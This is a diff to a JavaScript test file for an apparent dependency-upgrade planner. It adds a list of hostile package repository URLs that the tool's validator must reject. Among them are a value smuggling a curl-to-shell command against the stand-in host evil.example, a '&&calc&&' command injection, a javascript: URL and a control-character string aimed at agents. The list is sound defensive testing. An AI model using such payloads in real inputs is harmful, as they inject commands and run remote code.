@@ -389,7 +389,9 @@ test('a library that moves names its repository, where its release notes are whe
   assert.equal(libIn(await plan(world(md), app(options), { to: 21 }), 21, 'ngx-markdown').repository, 'https://github.com/jfcere/ngx-markdown');
   assert.match((await plan(world(md), app(options), { to: 21, text: true })).stdout, /ngx-markdown: 20\.0\.0 -> 21\.0\.0;.*; repository: https:\/\/github\.com\/jfcere\/ngx-markdown$/m);
 
-  for (const [repository, expected] of [['git://github.com/markedjs/marked.git', 'https://github.com/markedjs/marked'], ['git+ssh://git@github.com/ngrx/platform.git', 'https://github.com/ngrx/platform'], ['javascript:alert(1)', undefined], ['https://example.com/a b', undefined]]) {
+  // The package's author writes this, and an agent may paste it into a shell, so only URL-safe characters get through.
+  const hostile = ['javascript:alert(1)', 'https://example.com/a b', 'git+https://github.com/x/y$(curl${IFS}-s${IFS}evil.example|sh).git', "https://github.com/x/y'&&calc&&'", 'https://github.com/x/y\u0001see-instructions', 'https://github.com/x/y​z', `https://github.com/x/${'a'.repeat(300)}`];
+  for (const [repository, expected] of [['git://github.com/markedjs/marked.git', 'https://github.com/markedjs/marked'], ['git+ssh://git@github.com/ngrx/platform.git', 'https://github.com/ngrx/platform'], ['https://dev.azure.com/org/project/_git/ui/', 'https://dev.azure.com/org/project/_git/ui/'], ...hostile.map((h) => [h, undefined])]) {
     const lib = pkg('ui-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', repository } });
     const r = await plan(world(lib), app({ deps: { ...base, 'ui-lib': '^20.0.0' }, lock: { ...lockBase, 'ui-lib': '20.0.0' } }), { to: 21 });
     assert.equal(libIn(r, 21, 'ui-lib').repository, expected, repository);
